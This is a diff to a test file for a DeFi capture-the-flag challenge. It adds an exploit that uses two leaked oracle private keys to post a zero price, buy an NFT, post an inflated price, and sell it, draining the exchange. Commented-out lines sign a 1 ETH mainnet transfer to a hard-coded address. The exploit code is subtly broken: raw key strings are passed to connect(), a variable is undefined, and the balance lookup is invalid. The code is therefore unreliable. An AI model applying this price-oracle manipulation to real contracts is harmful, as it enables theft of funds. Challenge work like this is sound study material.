@@ -61,21 +61,58 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
-        const passwords = [
+        // better blender the ice up
+        const tokenId = 1;
+		const passwords = [
             "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
             "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
         ]
+		
         for (let i = 0; i < passwords.length; i++) {
+			await this.oracle.connect(passwords[i]).postPrice(symbolId, 0);
+        }
+		await this.exchange.connect(attacker.address).buyOne();
+		let exchangeBalance = this.exchange.balance;
+		for (let i = 0; i < passwords.length; i++) {
+			await this.oracle.connect(passwords[i]).postPrice(symbolId, exchangeBalance);
+        }
+		
+		await this.exchange.connect(attacker.address).sellOne();
+
+
+    //     const passwords = [
+    //         "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+    //         "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+    //     ]
+
+
+        
+    //     for (let i = 0; i < passwords.length; i++) {
             
-            let privateKey = passwords[i]
-            let wallet = new ethers.Wallet(privateKey)
-            
-            console.log(wallet.address)   
-       
-        for (let i = 0; i < sources.length; i++) {
-            //const signer = new ethers.Wallet(  passwords[i]);
-            console.log(1)
-        } }
+    //         let privateKey = passwords[i]
+    //         let wallet = new ethers.Wallet(privateKey)
+    //         console.log(wallet.address)   
+
+    //         // All properties are optional
+    //     let transaction = {
+    // nonce: 0,
+    // gasLimit: 21000,
+    // gasPrice: ethers.utils.bigNumberify("20000000000"),
+
+    // to: "0x88a5C2d9919e46F883EB62F7b8Dd9d0CC45bc290",
+    // // ... or supports ENS names
+    // // to: "ricmoo.firefly.eth",
+
+    // value: ethers.utils.parseEther("1.0"),
+    // data: "0x",
+
+    // // This ensures the transaction cannot be replayed on different networks
+    // chainId: ethers.utils.getNetwork('homestead').chainId
+    // }
+
+    // let signPromise = await  wallet.sign(transaction)
+
+    //       }
     });
     after(async function () {
         /** SUCCESS CONDITIONS */
